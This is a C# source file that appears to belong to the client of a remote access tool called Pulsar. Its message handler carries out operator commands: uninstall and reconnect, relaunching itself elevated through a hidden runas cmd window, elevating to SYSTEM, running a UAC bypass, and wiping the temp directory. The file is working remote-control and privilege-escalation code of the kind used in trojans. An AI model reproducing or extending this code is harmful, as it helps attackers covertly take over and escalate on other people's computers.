using Microsoft.Win32;
using Pulsar.Client.Config;
using Pulsar.Client.Helper;
using Pulsar.Client.Helper.UAC;
using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.User;
using Pulsar.Client.Utilities;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.ClientManagement.UAC;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.UAC;
using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly PulsarClient _client;
        private readonly PulsarApplication _application;

        public ClientServicesHandler(PulsarApplication application, PulsarClient client)
        {
            _application = application;
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                     message is DoClientDisconnect ||
                                                     message is DoClientReconnect ||
                                                     message is DoAskElevate ||
                                                     message is DoElevateSystem ||
                                                     message is DoDeElevate ||
                                                     message is DoUACBypass ||
                                                     message is DoClearTempDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
                case DoElevateSystem msg:
                    Execute(sender, msg);
                    break;
                case DoDeElevate msg:
                    Execute(sender, msg);
                    break;
                case DoUACBypass msg:
                    Execute(sender, msg);
                    break;
                case DoClearTempDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Starting uninstall process..." });
            try
            {
                new ClientUninstaller().Uninstall();
                client.Send(new SetStatus { Message = "Uninstallation complete. Exiting client." });
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            client.Send(new SetStatus { Message = "Disconnecting client..." });
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            client.Send(new SetStatus { Message = "Reconnecting client..." });
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            client.Send(new SetStatus { Message = "Checking for administrative privileges..." });

            if (userAccount.Type != AccountType.Admin)
            {
                client.Send(new SetStatus { Message = "Attempting to request elevation..." });

                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();
                try
                {
                    Process.Start(processStartInfo);
                    client.Send(new SetStatus { Message = "Elevation process started. Exiting current instance." });
                }
                catch
                {
                    client.Send(new SetStatus { Message = "User refused the elevation request." });
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already running with administrative privileges." });
            }
        }

        private void Execute(ISender client, DoElevateSystem message)
        {
            client.Send(new SetStatus { Message = "Attempting to elevate to SYSTEM..." });
            SystemElevation.Elevate(client);
        }

        private void Execute(ISender client, DoDeElevate message)
        {
            client.Send(new SetStatus { Message = "Attempting to de-elevate from SYSTEM..." });
            SystemElevation.DeElevate(client);
        }

        private void Execute(ISender client, DoUACBypass message)
        {
            client.Send(new SetStatus { Message = "Executing UAC bypass..." });
            Bypass.DoUacBypass();
            client.Send(new SetStatus { Message = "UAC bypass completed. Exiting client." });
            _client.Exit();
        }

        private void Execute(ISender client, DoClearTempDirectory message)
        {
            client.Send(new SetStatus { Message = "Starting temporary file cleanup..." });
            try
            {
                string tempPath = System.IO.Path.GetTempPath();
                string[] files = System.IO.Directory.GetFiles(tempPath, "*", System.IO.SearchOption.AllDirectories);
                int deletedFiles = 0;

                foreach (string file in files)
                {
                    try
                    {
                        System.IO.File.Delete(file);
                        deletedFiles++;
                    }
                    catch
                    {
                        // Ignore permission or lock errors
                    }
                }

                foreach (string dir in System.IO.Directory.GetDirectories(tempPath))
                {
                    try
                    {
                        System.IO.Directory.Delete(dir, true);
                    }
                    catch
                    {
                        // Ignore restricted directories
                    }
                }

                client.Send(new SetStatus { Message = $"Cleanup complete — {deletedFiles} files deleted." });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Temp cleanup failed: {ex.Message}" });
            }
        }
    }
}
